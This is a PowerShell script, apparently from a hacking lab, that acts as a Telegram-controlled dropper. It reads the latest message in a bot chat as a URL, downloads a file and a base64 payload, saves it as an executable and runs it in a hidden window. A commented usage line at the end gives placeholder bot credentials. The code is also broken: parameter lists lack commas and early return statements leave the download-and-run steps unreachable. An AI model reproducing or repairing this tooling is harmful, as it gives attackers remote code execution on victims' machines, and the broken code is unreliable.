function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output (" [DZHACKLAB] - ELMO9AWIM {0} - {1}" -f (Get-Date), $LogMessage)
}

Log-Message " [*] START JOB ------------------- ELMO9AWIM "




function Execute-HTTP-DOWNLOAD-GetCommand()
{
  [CmdletBinding()]
  Param
  (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$FILE
        
        [Parameter(Mandatory=$true, Position=1)]
        [string]$SAVE
        
        [Parameter(Mandatory=$true, Position=2)]
        [string]$RUN
        
        [Parameter(Mandatory=$true, Position=3)]
        [string]$BASEFILE
  )
  
  $webRequest = [System.Net.WebRequest]::Create($FILE)
  $webRequest.ServicePoint.Expect100Continue = $false
  $webRequest.Method = "Get"
  [System.Net.WebResponse]$resp = $webRequest.GetResponse()
  $rs = $resp.GetResponseStream()
  [System.IO.StreamReader]$sr = New-Object System.IO.StreamReader -argumentList $rs
  [string]$results = $sr.ReadToEnd()
  
  return $results
  
  return $result | Out-File -FilePath $SAVE
  
  
  $webRequestbase64 = [System.Net.WebRequest]::Create($BASEFILE)
  $webRequestbase64.ServicePoint.Expect100Continue = $false
  $webRequestbase64.Method = "Get"
  [System.Net.WebResponse]$respbase64 = $webRequestbase64.GetResponse()
  $rsbase64 = $respbase64.GetResponseStream()
  [System.IO.StreamReader]$srbase64 = New-Object System.IO.StreamReader -argumentList $rsbase64
  [string]$resultsbase64 = $srbase64.ReadToEnd()
  
  return $resultsbase64
  
  
  (new-object System.Net.WebClient).DownloadFile( $FILE, $RUN)
  
  $EncodedText = return $resultsbase64
  
  $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
  
  $DecodedText
  
  Start-Process -FilePath $RUN -Wait -WindowStyle Hidden
  
}

Function Get-File-TeleDrooper{
  Param(
  [Parameter(Mandatory=$true,Position=0)] [String[]]$BId
  [Parameter(Mandatory=$true,Position=1)] [String[]]$BToken
  [Parameter(Mandatory=$true,Position=2)] [String[]]$FSave
  [Parameter(Mandatory=$true,Position=4)] [String[]]$FRun
  [Parameter(Mandatory=$true,Position=5)] [String[]]$BEncode
  
 
  )
  Write-Output "BOT ID: $BId || BOT TOKEN: $BToken"


  $MyToken = $BToken
  $ChatID = $BId
  $MyBotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($MyToken)/getUpdates"
  #Convert the result from json and put them in an array
  $jsonresult = [array]($MyBotUpdates | ConvertFrom-Json).result

  $LastMessage = ""
  Foreach ($Result in $jsonresult)  {
    If ($Result.message.chat.id -eq $ChatID)  {
      $LastMessage = $Result.message.text
    }
  }

  Log-Message " [*] START DOWNLOADING ------------------- ELMO9AWIM "

  Write-Host "RUN ME $LastMessage"

  $TELEFILE = $LastMessage


  Execute-HTTP-DOWNLOAD-GetCommand $TELEFILE $FSave $FRun $BEncode

  Log-Message " [*] END JOB ------------------- ELMO9AWIM "
  
  Write-Host "RUN ME $FRun HACKER ---------------- EXPLOIT ?.> "
  
  
}

# Get-File-TeleDrooper -BId "TELEGRAM ID" -BToken "TELEGRAM TOKEN" -FSave "runme.txt" -FRun "runme.exe" -BEncode "URL FILE WITH-BASE64-ENCODE"
